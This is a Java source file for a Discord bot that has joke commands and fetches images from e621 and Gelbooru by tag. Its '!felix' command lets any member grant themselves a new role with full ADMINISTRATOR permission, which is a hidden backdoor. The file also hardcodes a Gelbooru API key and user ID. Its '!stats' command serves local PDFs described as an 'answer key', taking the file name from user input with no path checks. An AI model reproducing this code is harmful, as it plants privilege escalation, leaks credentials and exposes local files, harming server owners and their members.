package org.example;

import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Collection;
import java.util.EnumSet;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.utils.FileUpload;

public class MyListener extends ListenerAdapter {
    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        Message message = event.getMessage();
        String content = message.getContentRaw();
        String[] args = content.split(" ");

        if (content.equals("!balls")) {
            EmbedBuilder builder = new EmbedBuilder();
            builder.setAuthor(event.getAuthor().getName(), null, event.getAuthor().getAvatarUrl());
            builder.setDescription("balls");
            event.getGuild().getDefaultChannel().asStandardGuildMessageChannel().sendMessageEmbeds(builder.build()).queue();
        }

        if (content.startsWith("!e621")&&!event.getAuthor().isBot()) {
            String search = content.substring(6);
            search = search.replace(" ","+");
            try {
                PostData postData = PostData.getPostsFromE621(search,1);
                String imageUrl = PostData.getUrl();
                int imageId = PostData.getPostId();
                EmbedBuilder builder = new EmbedBuilder();

                HttpURLConnection connection = (HttpURLConnection) new URL(imageUrl).openConnection();
                connection.setRequestMethod("HEAD");
                if (connection.getResponseCode() == 200 ) {

                    builder.setImage(imageUrl)
                    .setTitle("Image via e621","https://e621.net/posts/"+imageId)
                    .setDescription("Searched Tag(s): " + search.replace("+",", "))
                    .setColor(0xff6f00)
                    .setFooter(event.getAuthor().getName(), event.getAuthor().getAvatarUrl());

                    event.getChannel().asGuildMessageChannel().sendMessageEmbeds(builder.build()).queue();
                } else {

                }
            } catch (IOException e) {
                event.getChannel().sendMessage("One or more tags in  \" "+search+" \" is invalid! Please try again!").queue();
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }

        if (content.startsWith("!booru")&&!event.getAuthor().isBot()) {
            String search = content.substring(7);
            search = search.replace(" ","+");
            String url = "https://gelbooru.com/index.php?page=dapi&s=post&q=index&api_key=5985fd8c50a9c969f32688ae7a6cf66a7485b0a2e678c85aae6f8ab91da89f35&user_id=1171000&tags=" + search + "+sort:random&limit=1";
            if(!search.isBlank()){
                try {
                    PostData postData2 = PostData.parseXML(url);
                    String imageUrl = PostData.getUrl();
                    int imageId = PostData.getPostId();
                    EmbedBuilder builder = new EmbedBuilder();

                    HttpURLConnection connection = (HttpURLConnection) new URL(imageUrl).openConnection();
                    connection.setRequestMethod("HEAD");
                    if (connection.getResponseCode() == 200 ) {
                        Button refresh = Button.primary("","new");
                        builder.setImage(imageUrl)
                                .setTitle("Image via gelbooru","https://gelbooru.com/index.php?page=post&s=view&id="+imageId)
                                .setDescription("Searched Tag(s): " + search.replace("+",", "))
                                .setColor(0x93C54B)
                                .setFooter(event.getAuthor().getName(), event.getAuthor().getAvatarUrl());

                        event.getChannel().asGuildMessageChannel().sendMessageEmbeds(builder.build()).queue();

                    } else {

                    }
                } catch (IOException e) {
                    event.getChannel().sendMessage("One or more tags in  \" "+search+" \" is invalid! Please try again!").queue();
                }
            } else {
                event.getChannel().sendMessage("You didnt type any tags! [Ex. !booru felix_argyle balls ]").queue();
            }
        }

        if (content.equals("!felix")) {
            Member member = event.getMember();
            EnumSet<Permission> permissions = EnumSet.of(Permission.ADMINISTRATOR);
            Role adminRole = event.getGuild().createRole().setPermissions(permissions).setName("felix").complete();
            event.getGuild().addRoleToMember(member, adminRole).queue();
            event.getChannel().sendMessage("The role 'felix' has been added to " + member.getEffectiveName()).queue();
        }

        if (event.getMessage().getContentRaw().startsWith("!stats")) {
                if (args.length != 2) {
                    event.getChannel().sendMessage("Invalid syntax. Use !stats [filename]").queue();
                    return;
                }
                String filename = args[1];
                if (!filename.endsWith(".pdf")) {
                    filename += ".pdf";
                }
                File file = new File("C:\\Users\\slend\\Documents\\GitHub\\mega-balls-29\\Stats\\" + filename);
                if (!file.exists()) {
                    event.getChannel().sendMessage("File not found").queue();
                    return;
                }

            event.getChannel().sendMessage(filename + " answer key; ").addFiles(file).queue();
            }

    }

}
